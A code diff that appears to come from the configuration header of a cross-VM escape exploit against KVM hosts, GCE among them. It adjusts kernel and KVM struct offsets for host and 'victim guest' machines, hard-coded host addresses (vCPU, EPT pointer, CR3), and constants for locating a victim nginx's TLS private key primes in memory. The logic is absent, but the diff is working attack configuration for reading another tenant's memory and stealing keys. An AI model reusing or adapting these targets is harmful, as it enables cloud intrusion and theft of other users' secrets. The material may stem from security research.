@@ -19,6 +19,10 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
  ************************  Victim Guest Kernel Layout  ************************
  ******************************************************************************/
 
+ #define TASK_COMM_LEN 0x10
+
+ #if MACHINE == FATHER
+
 #define G_INIT_NAME		"swapper/"
 #define G_TEXT_INIT_TASK	0x1c112c0	// struct task_struct init_task
 
@@ -29,7 +33,29 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
 #define G_TASK_COMM		0xba8	// char comm[TASK_COMM_LEN]
 // };
-#define G_TASK_COMM_LEN		0x10
+
+// struct mm_struct {
+#define G_MM_PGD		0x78	// pgd_t *pgd
+// #define G_MM_HEAP		0x158	// unsigned long start_brk
+#define G_MM_HEAP		0x158 + 0x10 // start_arg
+// };
+
+#define NGINX_SSLKEY		0x0 // 0x8b99f
+#define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
+#define SSLKEY_MAGIC		0x00818102
+
+#elif MACHINE == GCE
+
+#define G_INIT_NAME		"swapper/"
+#define G_TEXT_INIT_TASK	0x2011f80	// struct task_struct init_task
+
+// struct task_struct {
+#define G_TASK_TASKS		0x890	// struct list_head tasks
+#define G_TASK_MM		0x940	// struct mm_struct *mm
+#define G_TASK_PID		(0x890+0xd0) // 0x9c0	// pid_t pid, tgid
+#define G_TASK_PID_LINKS	0x9f8	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
+#define G_TASK_COMM		0xb80	// char comm[TASK_COMM_LEN]
+// };
 
 // struct mm_struct {
 #define G_MM_PGD		0x78	// pgd_t *pgd
@@ -40,12 +66,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define SSLKEY_LEN		(4 + 128 + 4 + 128) // magic + prime1 + magic + prime2
 #define SSLKEY_MAGIC		0x00818102
 
-#if MACHINE == FATHER
-#undef G_MM_HEAP
-#undef NGINX_SSLKEY
-#define G_MM_HEAP		0x158 + 0x10 // start_arg
-#define NGINX_SSLKEY		0x0  // start of arg
-#endif
+#endif // MACHINE
 
 
 /******************************************************************************
@@ -82,7 +103,6 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define H_TASK_PID_LINKS	0xa40	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
 #define H_TASK_COMM		0xbf0	// char comm[TASK_COMM_LEN]
 // };
-#define H_TASK_COMM_LEN		0x10
 
 // struct mm_struct {
 #define H_MM_PGD		0x78	// pgd_t *pgd
@@ -127,7 +147,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 // struct kvm_vcpu {
 #define H_VCPU_KVM		0x0	// struct kvm *kvm
 #define H_VCPU_PID		0x90	// struct pid *pid
-#define H_VCPU_ARCH		0x120	// struct kvm_vcpu_arch arch
+#define H_VCPU_ARCH		0x138	// struct kvm_vcpu_arch arch
 // };
 
 // struct pid {
@@ -138,10 +158,10 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define H_TASK_PRIOS		0x64	// int static_prio, normal_prio, rt_priority
 #define H_TASK_TASKS		0x900	// struct list_head tasks
 #define H_TASK_MM		0x950	// struct mm_struct *mm
+#define H_TASK_PID		0x9d0	// pid_t pid, tgid
 #define H_TASK_PID_LINKS	0xa78	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
 #define H_TASK_COMM		0xc38	// char comm[TASK_COMM_LEN]
 // };
-#define H_TASK_COMM_LEN		0x10
 
 // struct mm_struct {
 #define H_MM_PGD		0x80	// pgd_t *pgd
@@ -200,7 +220,6 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define H_TASK_PID_LINKS	0xa78	// struct hlist_node pid_links[PIDTYPE_MAX] <-- PID_TASKS
 #define H_TASK_COMM		0xc48	// char comm[TASK_COMM_LEN]
 // };
-#define H_TASK_COMM_LEN		0x10
 
 // struct mm_struct {
 #define H_MM_PGD		0x80	// pgd_t *pgd
@@ -257,12 +276,16 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #elif MACHINE == GCE
 
 // ---------[ rain-vm-gce ]---------
-#define BASE		0x88d43f218UL
-#define HOST_DIRECT_MAP	0xffff934040000000
-#define OWN_VCPU	0xffff9352eff70e40 // 0xffff934153430e80
-#define OWN_TASK	0xffff936a91dba000
-#define HCR3		0x111cf6000UL
-#define OWN_KVM		0xffff9584f2d71000
+// #define BASE		0x88d43f218UL
+// #define HOST_DIRECT_MAP	0xffff934040000000
+// #define OWN_VCPU	0xffff9352eff70e40 // 0xffff934153430e80
+// #define OWN_TASK	0xffff936a91dba000
+// #define HCR3		0x111cf6000UL
+// #define OWN_KVM		0xffff9584f2d71000
+// #define VICTIM_VCPU	0xffff934214b80f40
+// #define EPTP            0x12cc82000UL
+// #define GCR3            0x3987106000UL
+// #define GTEXT		0xffffffffb7600000
 // ---------[ rain-vm-gce-victim ]---------
 // #define BASE		0x257d33218UL
 // #define HOST_DIRECT_MAP	0xffff934040000000
